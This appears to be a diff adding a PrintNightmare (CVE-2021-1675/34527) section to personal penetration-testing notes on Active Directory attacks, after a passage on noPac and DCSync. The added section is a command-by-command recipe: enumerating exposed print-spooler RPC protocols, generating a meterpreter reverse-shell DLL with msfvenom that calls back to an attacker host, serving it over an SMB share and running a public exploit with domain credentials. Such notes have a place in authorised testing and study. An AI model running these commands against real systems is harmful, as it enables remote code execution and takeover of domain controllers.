@@ -30,3 +30,31 @@ This attack will leave the TGT on the attack host in the directory it was run. T
 > We can use the `-dump` flag with noPac to a DCSync attack using [[Abusing ACLs#Using secretsdump.py|secretsdump.py]].
 
 This tool makes use of `smbexec.py` (*from Impacket*) which can be quite noisy and easily detected by Windows Defender (*and other AVs*).
+
+## PrintNightmare
+**CVEs**:
+- [CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) : Print spooler improperly performs privileged file operations, allowing RCE
+- [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675) : Not publicly disclosed - Allows RCE
+**Tool**: [cube0x0's](https://twitter.com/cube0x0?lang=en)
+
+There are a number of exploits out there that use the RCE vulnerabilities, [cube0x0's](https://twitter.com/cube0x0?lang=en) is a popular one.
+> Annoyingly, [cube0x0's](https://twitter.com/cube0x0?lang=en) exploit uses a modified version of Impacket. `github.com/cube0x0/impacket`.
+
+```Bash
+rpcdump.py @[dc-ip] | egrep 'MS-RPRN|MS-PAR'
+```
+Lets us determine if `Print System Asynchronous Protocol` and `Print System Remote Protocol` are exposed on the target.
+
+### Create a DLL payload with [[MSFVenom]]
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[ATK_host] LPORT=[ATK_port] -f dll > [filename].dll
+```
+> Make sure to start an MSF multi/handler
+### Host the DLL in an SMB Server
+```bash
+sudo smbserver.py -smb2support [share_name] [path_to_dll]
+```
+### Exploit
+```bash
+sudo python3 CVE-2021-1675.py [domain]/[user]:[pass] '\\[ATK_host]\[share_name]\[filename].dll'
+```
